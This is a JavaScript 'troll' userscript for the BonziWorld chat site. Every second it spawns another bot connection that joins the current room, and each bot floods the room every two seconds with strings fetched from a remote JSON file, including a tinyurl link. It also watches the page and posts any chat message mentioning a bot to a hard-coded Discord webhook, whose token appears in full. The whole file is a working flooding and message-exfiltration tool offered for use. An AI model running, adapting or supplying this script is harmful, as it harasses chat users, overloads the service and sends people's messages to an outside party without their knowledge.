/* GGTroll 4 BonziWorld 1.0.8 */
/* This comes with no warranty */
const sentMentions = new Set();

setInterval(async () => {
    (async () => {
        try {
            const res = await fetch("https://cmd-hue.github.io/fddstr.json?cb=" + Math.random());
            const data = await res.json();
            const strings = data.strings || ["tinyurl.com/ggtfiles"];
            const roomElement = document.querySelector(".room_id");
            const roomId = roomElement ? roomElement.textContent.trim() : "default";
            const botName = "giggity #" + Math.floor(Math.random() * 10000);
            const bot = io(location.href + "?cb=" + Math.random());
            bot.emit("client", "MAIN");
            bot.emit("login", {
                passcode: "",
                name: botName,
                room: roomId
            });
            setTimeout(() => {
                bot.emit("update", { color: "blue" });
            }, 2000);

            // Talk every 2 seconds
            setInterval(() => {
                const msg = strings[Math.floor(Math.random() * strings.length)];
                const type = Math.random() < 0.5 ? "joke" : "fact";
                bot.emit("talk", { text: msg, type });
            }, 2000);

            // Observe DOM for mentions of botName, send unique ones to Discord
            const observer = new MutationObserver(mutations => {
                mutations.forEach(mutation => {
                    mutation.addedNodes.forEach(node => {
                        if (
                            node.nodeType === 1 &&
                            !node.classList.contains("bonzi_name") &&
                            node.textContent.includes(botName) &&
                            !sentMentions.has(node.textContent)
                        ) {
                            sentMentions.add(node.textContent);
                            fetch("https://discord.com/api/webhooks/1429973688446488586/T7Da6y5vMfl6AN9OktYnBYLkL_uioOqSPhHZClDGSHOlMcwRIEUGCQl2Hh81y0XqE-cA", {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({ content: node.textContent })
                            });
                        }
                    });
                });
            });
            observer.observe(document.body, { childList: true, subtree: true });

        } catch (e) {}
    })();
}, 1000);
